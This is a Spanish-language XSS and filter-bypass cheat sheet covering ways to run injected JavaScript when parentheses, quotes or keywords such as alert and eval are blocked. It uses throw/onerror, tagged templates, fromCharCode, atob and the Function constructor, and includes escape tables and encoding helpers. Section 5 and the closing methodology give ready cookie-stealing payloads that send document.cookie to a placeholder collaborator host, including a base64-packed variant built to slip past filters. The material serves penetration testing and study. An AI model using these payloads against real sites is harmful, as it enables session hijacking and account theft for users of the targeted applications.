---
tags:
  - obfuscation
  - javascript
  - xss
  - filter-bypass
  - waf-bypass
---

# JavaScript - Ofuscación y ejecución con filtros

El caso central: tienes un punto de inyección JS donde controlas un texto que
acaba dentro de algo como:

```javascript
eval(`${textoModificable}`)      // o setTimeout, Function, innerHTML+handler, etc.
```

...pero el input está **restringido / sanitizado**: te quitan `()`, o comillas,
o ciertas palabras (`alert`, `eval`, `cookie`...), o solo dejan `[a-zA-Z0-9]`.

Este archivo va de **cómo seguir ejecutando código igualmente**.

Regla mental: el filtro bloquea **caracteres/strings literales**. Tú expresas lo
mismo con **otra representación** que el intérprete JS acaba resolviendo al mismo
valor. Tres palancas: **(A) llamar sin los caracteres prohibidos**,
**(B) construir el string en runtime**, **(C) codificarlo**.

---

## 🔎 Índice de bypasses

| Te filtran… | Técnicas (bypass) | Ir a |
|-------------|-------------------|------|
| **nada** (PoC) | `alert(1)` | [[#0. El baseline: `alert(1)`\|§0]] |
| **`()`** paréntesis | throw+onerror · throw+onerror=eval · backticks `` fn`` · `location=javascript:` · event handlers | [[#1. Te filtran los PARÉNTESIS `()`\|§1]] |
| **comillas** `'` `"` | backticks · `String.fromCharCode` · `/regex/.source` · escapes `\xNN`/`\uNNNN` | [[#2. Te filtran las COMILLAS `'` `"`\|§2]] |
| **keywords** (`eval`,`alert`…) | corchetes+troceo `['al'+'ert']` · `Function`/`constructor` · `atob(base64)` · combinado | [[#3. Te filtran PALABRAS CLAVE (`eval`, `alert`, `cookie`, `Function`...)\|§3]] |
| **sink** `` eval(`${x}`) `` | variantes según lo permitido | [[#4. El caso ``eval(`${textoModificable}`)`` — variantes según lo permitido\|§4]] |
| — | exfiltración (cookie) | [[#5. Payloads finales (exfiltración)\|§5]] |
| — | tabla de escapes `\xNN`/`\uNNNN`/HTML/URL | [[#6. Tabla de escapes (string -> representación)\|§6]] |
| — | generar escapes (JS/bash/PS) · **o** `obfuscate.py` | [[#7. Generar los escapes (herramientas)\|§7]] |
| — | chuleta de decisión rápida | [[#8. Chuleta de decisión\|§8]] |

> Ver también: [[encodings]] (encoding por objetivo) · [[xss-obfuscation]] · [[html-obfuscation]].

---

## 0. El baseline: `alert(1)`

Antes de ofuscar, confirma que ejecutas algo. Payload de prueba mínimo:

```javascript
alert(1)
```

A partir de aquí, cada restricción que te encuentres tiene su bypass. Ve bajando
por las secciones según lo que te bloqueen.

---

## 1. Te filtran los PARÉNTESIS `()`

Necesitas **invocar una función sin escribir `(` `)`**.

### 1.1 `throw` + `onerror` (la más usada para PoC)
El navegador, al lanzar un `throw`, llama a `window.onerror(mensaje)`. Si pones
`onerror = alert`, el argumento de `throw` se convierte en el argumento de `alert`.
```javascript
onerror=alert;throw 1                 // -> alert(1)
onerror=alert;throw document.cookie   // -> alert(cookie)
```

### 1.2 `throw` + `onerror=eval` (para ejecutar código arbitrario)
Si el handler de error es `eval`, lo que lances se **evalúa como código**:
```javascript
window.onerror=eval;throw'=alert\x281\x29';
window.onerror=eval;throw"\x3d1;alert\x281\x29";
```
- `throw '=alert(1)'` -> el navegador construye el mensaje `"Uncaught =alert(1)"`.
  El `=` inicial hace que `Uncaught` sea el lado izquierdo de una asignación
  inofensiva y `alert(1)` se ejecute. (Detalles según navegador; alinea con PoC.)

### 1.3 Backticks / template literals — sustituyen a `()`
Una etiqueta de plantilla `` fn`...` `` **llama a la función**:
```javascript
alert`1`
print`1`
setTimeout`alert\x281\x29`    // setTimeout evalúa el STRING como código
```
> Ojo: `` eval`...` `` recibe un **array** (las partes de la plantilla), no un
> string, así que `eval` con backticks no evalúa bien. Para "evaluar un string
> con backticks" usa **`setTimeout`** o `Function`.

### 1.4 `location` / `javascript:` (contexto de URL o atributo)
```javascript
location='javascript:alert%281%29'    // ( ) van URL-encoded como %28 %29
location.href='javascript:alert\x281\x29'
```

### 1.5 Handlers de evento (el navegador invoca por ti)
Aquí no escribes tú los `()`, los "pone" el navegador al disparar el evento:
```html
<img src=x onerror=alert`1`>
<img src=x onerror=onerror=eval;throw'=alert\x281\x29'>
<svg onload=alert`1`>
```

---

## 2. Te filtran las COMILLAS `'` `"`

No puedes escribir strings literales. Alternativas para tener un string:

### 2.1 Backticks
```javascript
eval(`alert\x281\x29`)
```

### 2.2 `String.fromCharCode` (sin comillas, todo números)
```javascript
eval(String.fromCharCode(97,108,101,114,116,40,49,41))   // "alert(1)"
```
Generar los códigos:
```javascript
'alert(1)'.split('').map(c=>c.charCodeAt(0)).join(',')
// => 97,108,101,114,116,40,49,41
```

### 2.3 `/regex/.source` (obtener un string sin comillas)
```javascript
eval(/alert(1)/.source)   // .source = "alert(1)"
```

### 2.4 Escapes `\xNN` / `\uNNNN` dentro de un backtick
```javascript
eval(`\x61\x6c\x65\x72\x74\x28\x31\x29`)   // alert(1)
```

---

## 3. Te filtran PALABRAS CLAVE (`eval`, `alert`, `cookie`, `Function`...)

La palabra no aparece literal en tu input, pero la **reconstruyes en runtime**.

### 3.1 Acceso por corchetes + string troceado
`window['al'+'ert'](1)` en vez de `alert(1)`:
```javascript
window['al'+'ert'](1)
top['ale'+'rt'](1)
self['ev'+'al']('alert(1)')
```

### 3.2 `Function` constructor (equivalente a eval)
```javascript
Function('alert(1)')()
[].constructor.constructor('alert(1)')()   // sin escribir "Function"
[]['fill']['constructor']('alert(1)')()
```
`[].constructor` es `Array`; `Array.constructor` es `Function`. Así llegas a
`Function` sin teclearla.

### 3.3 Reconstruir desde base64 (`atob`)
Si `alert`/`document.cookie` están en blacklist como texto, escóndelos en base64:
```javascript
eval(atob('YWxlcnQoMSk='))                    // atob(...) = "alert(1)"
setTimeout(atob('YWxlcnQoMSk='))
```
Generar el base64 (consola del navegador):
```javascript
btoa('alert(1)')                              // "YWxlcnQoMSk="
btoa("document.location='https://COLLAB/?c='+document.cookie")
```

### 3.4 Combinar todo (keyword + comillas + parens filtrados)
```javascript
setTimeout`eval\x28atob\x28\x27YWxlcnQoMSk\x3d\x27\x29\x29`
// El único "paréntesis real" es el backtick de setTimeout.
// Dentro: eval(atob('YWxlcnQoMSk='))  con ( ) ' = escapados como \x28 \x29 \x27 \x3d
```

---

## 4. El caso ``eval(`${textoModificable}`)`` — variantes según lo permitido

Contexto: el sink es literalmente ``eval(`${x}`)`` y tú controlas `x`. Lo que
metas en `x` se **interpola** y luego se **evalúa**. Es el mejor sink posible:
casi cualquier cosa que sea "código JS válido" corre.

### 4.1 Sin restricciones -> mete código directo
```javascript
// x =
alert(1)
```

### 4.2 Si NO se permiten `()` en `x`
Dentro de `eval` ya no necesitas parens si usas las técnicas de la sección 1:
```javascript
// x =
onerror=alert;throw 1
// x =
window.onerror=eval;throw'=alert\x281\x29'
// x =
setTimeout`alert\x281\x29`
// x =
alert`1`
```

### 4.3 Si NO se permiten comillas en `x`
Usa backticks / fromCharCode / regex.source (sección 2):
```javascript
// x =
alert`1`
// x =
eval(String.fromCharCode(97,108,101,114,116,96,49,96))   // alert`1`
```

### 4.4 Si NO se permiten `()` NI comillas
Combina backticks + escapes:
```javascript
// x =
alert`1`
// x =
setTimeout`alert\x281\x29`
```

### 4.5 Si filtran palabras (`alert`, `eval`...) dentro de `x`
Reconstruye con base64 o troceo (sección 3). Como YA estás dentro de un `eval`
externo, con montar el string y que ese eval lo evalúe suele bastar:
```javascript
// x =  (deja que el eval externo evalúe el resultado de atob, sin () propios:
//        apóyate en setTimeout con backtick)
setTimeout`\x65val\x28atob\x28\x60YWxlcnQoMSk\x3d\x60\x29\x29`
```

### 4.6 Si solo permiten `[a-zA-Z0-9]` (alfanumérico puro)
Caso extremo. Se puede construir JS solo con `[]()!+` (estilo JSFuck) pero eso
necesita esos símbolos. Con **solo alfanumérico** dentro de un `eval` externo,
tu mejor baza es que el propio contexto te deje encadenar identificadores/props.
> Regla: **enumera exactamente qué caracteres pasan el filtro** (mándate `x` con
> cada símbolo y mira cuáles sobreviven) y construye el payload solo con esos.

---

## 5. Payloads finales (exfiltración)

Cuando confirmes ejecución con `alert`, cambia al payload real.

### 5.1 Robar cookie
```javascript
document.location='https://TU-COLLAB/?c='+document.cookie
fetch('https://TU-COLLAB/?c='+document.cookie)
new Image().src='https://TU-COLLAB/?c='+document.cookie
navigator.sendBeacon('https://TU-COLLAB/',document.cookie)
```

### 5.2 Empaquetado en base64 (para meterlo por el filtro)
```javascript
// En la consola del navegador:
btoa("fetch('https://TU-COLLAB/?c='+document.cookie)")
// Luego:
setTimeout`eval\x28atob\x28\x27<ESE_BASE64>\x27\x29\x29`
```

---

## 6. Tabla de escapes (string -> representación)

`\xNN` = un carácter por su código en **hex de 2 dígitos**. `\uNNNN` = 4 dígitos.

| Char | `\xNN` | `\uNNNN` | HTML ent. | URL |
|------|--------|----------|-----------|-----|
| `(`  | `\x28` | `(` | `&#40;` / `&lpar;` | `%28` |
| `)`  | `\x29` | `)` | `&#41;` / `&rpar;` | `%29` |
| `'`  | `\x27` | `'` | `&#39;` | `%27` |
| `"`  | `\x22` | `"` | `&#34;` / `&quot;` | `%22` |
| `=`  | `\x3d` | `=` | `&#61;` | `%3d` |
| `;`  | `\x3b` | `;` | `&#59;` | `%3b` |
| `/`  | `\x2f` | `/` | `&#47;` / `&sol;` | `%2f` |
| `<`  | `\x3c` | `<` | `&lt;` | `%3c` |
| `>`  | `\x3e` | `>` | `&gt;` | `%3e` |
| `` ` `` | `\x60` | ``` | `&#96;` | `%60` |
| `$`  | `\x24` | `$` | `&#36;` | `%24` |
| `.`  | `\x2e` | `.` | `&#46;` | `%2e` |
| `:`  | `\x3a` | `:` | `&#58;` | `%3a` |
| esp. | `\x20` | ` ` | `&#32;` | `%20` |

---

## 7. Generar los escapes (herramientas)

### JS (consola del navegador)
```javascript
// String -> todo \xNN
[...'alert(1)'].map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')
// => "\x61\x6c\x65\x72\x74\x28\x31\x29"

// Solo los caracteres "peligrosos" (más legible)
'alert(1)'.replace(/[()'"=;<>\/`$]/g,
  c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0'))
// => "alert\x281\x29"

// String -> \uNNNN
[...'alert(1)'].map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('')

// Base64
btoa('alert(1)')          // codificar
atob('YWxlcnQoMSk=')      // decodificar
```

### Bash
```bash
echo -n 'alert(1)' | xxd -p -c1 | sed 's/^/\\x/' | tr -d '\n'; echo
echo -n 'alert(1)' | base64
```

### PowerShell
```powershell
-join ([char[]]'alert(1)' | % { '\x{0:x2}' -f [int]$_ })
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('alert(1)'))
```

---

## 8. Chuleta de decisión

| Te bloquean...             | Usa esto                                               |
|----------------------------|--------------------------------------------------------|
| nada (PoC)                 | `alert(1)`                                              |
| `()`                       | `onerror=alert;throw 1`  /  `` alert`1` ``             |
| `()` y quieres eval de str | `window.onerror=eval;throw'=alert\x281\x29'`           |
| comillas                   | `` alert`1` ``  /  `String.fromCharCode(...)`          |
| keyword `alert`/`eval`     | `window['al'+'ert'](1)`  /  `atob('...')`              |
| todo junto / payload largo | `` setTimeout`eval\x28atob\x28\x27<b64>\x27\x29\x29` `` |
| contexto URL/atributo      | `location='javascript:alert%281%29'`                   |

> Metodología: **(1)** confirma ejecución con `alert`. **(2)** enumera qué
> caracteres pasa el filtro. **(3)** construye el payload real solo con esos.
> **(4)** cambia a exfiltración.
